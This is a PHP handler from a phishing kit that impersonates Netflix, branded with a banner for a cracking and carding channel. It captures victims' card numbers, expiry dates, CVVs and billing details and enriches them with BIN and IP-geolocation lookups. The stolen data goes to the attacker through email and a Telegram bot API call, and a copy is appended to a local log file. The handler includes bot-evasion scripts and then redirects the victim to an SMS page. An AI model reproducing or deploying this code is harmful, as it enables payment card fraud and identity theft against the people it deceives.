<?php
/*



 ██████╗██╗     ███████╗ █████╗ ███╗   ██╗        ████████╗ ██████╗  ██████╗ ██╗     ███████╗        ███╗   ██╗███████╗████████╗
██╔════╝██║     ██╔════╝██╔══██╗████╗  ██║        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝        ████╗  ██║██╔════╝╚══██╔══╝
██║     ██║     █████╗  ███████║██╔██╗ ██║           ██║   ██║   ██║██║   ██║██║     ███████╗        ██╔██╗ ██║█████╗     ██║   
██║     ██║     ██╔══╝  ██╔══██║██║╚██╗██║           ██║   ██║   ██║██║   ██║██║     ╚════██║        ██║╚██╗██║██╔══╝     ██║   
╚██████╗███████╗███████╗██║  ██║██║ ╚████║███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗███████║███████╗██║ ╚████║███████╗   ██║   
 ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   

[ Cracking , Hacking , Method , Spamming , Giveaways , Carding , Database , Courses ]

[ Channel : @clean_tools_net ]

[ Website : www.clean-tools.net ]

      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/

session_start();
error_reporting(0);
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";
$_SESSION['api'] = $api;
$_SESSION['chatid'] = $chatid;
$_SESSION['youremail'] = $email;

$_SESSION['cardholder'] = $_POST['cardholder'];
$_SESSION['creditCardNumber'] = $_POST['creditCardNumber'];
$_SESSION['creditExpirationMonth'] = $_POST['creditExpirationMonth'];
$_SESSION['creditCardSecurityCode'] = $_POST['creditCardSecurityCode'];

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$hostname = gethostbyaddr($ip);
$bincheck = $_POST['creditCardNumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['creditCardNumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$cardlastdigit = substr($_POST['creditCardNumber'],12,16);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];


$message = "[+]━━━━【🔥 NetFlix CC Fire 🔥】━━━━[+]\r\n";
$message .= "[+]Card Holder      	 : ".$_POST['cardholder']."\r\n";
$message .= "[+] [💳 Credit Card Number]     	 : ".$_POST['creditCardNumber']."\r\n";
$message .= "[+] [🔄 Expiry Date ]     	 : ".$_POST['creditExpirationMonth']."\r\n";
$message .= "[+] [🔑 (CVV)]    	 : ".$_POST['creditCardSecurityCode']."\r\n";
$message .= "[+]━━━━【🏦 Bank Details】━━━━[+]\r\n";
$message .= "[+] Bank name       : ".$_SESSION['bank_name']."\r\n";
$message .= "[+] Bank scheme      : ".$_SESSION['bank_scheme']."\r\n";
$message .= "[+] Bank type      : ".$_SESSION['bank_type']."\r\n";
$message .= "[+] Bank Brand      : ".$_SESSION['bank_brand']."\r\n";
$message .= "[+] Bank Country      : ".$_SESSION['bank_country']."\r\n";
$message .= "[+]━━━━【📓 Billing INFO】━━━━[+]\r\n";
$message .= "[+] First Name          : ".$_SESSION['firstName']."\r\n";
$message .= "[+] Last Name          : ".$_SESSION['lastName']."\r\n";
$message .= "[+] Country      	 : ".$_SESSION['country']."\r\n";
$message .= "[+] Billing Address      	 : ".$_SESSION['address']."\r\n";
$message .= "[+] Billing Address 2       : ".$_SESSION['address2']."\r\n";
$message .= "[+] City     	 : ".$_SESSION['city']."\r\n";
$message .= "[+] State        : ".$_SESSION['city']."\r\n";
$message .= "[+] Phone     	 : ".$_SESSION['phone']."\r\n";
$message .= "[+] Date of birth      : ".$_SESSION['birthday']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n[+] Country : ".$COUNTRY."[+] City: " .$CITY."[+] Region : " .$REGION."[+] State: " .$STATE."[+] Zip : " .$ZIPCODE."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[+]━━━━【🔥 NetFlix CC Fire 🔥】━━━━[+]\n";
$_SESSION['message'] = $message;

$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "🔥 NetFlix log 🔥  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
@mail($email,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$myfile = fopen("NetFlix_RzlT.txt", "a+");$txt = $message;fwrite($myfile, $txt);fclose($myfile);

HEADER("Location: ../sms.php");



?>
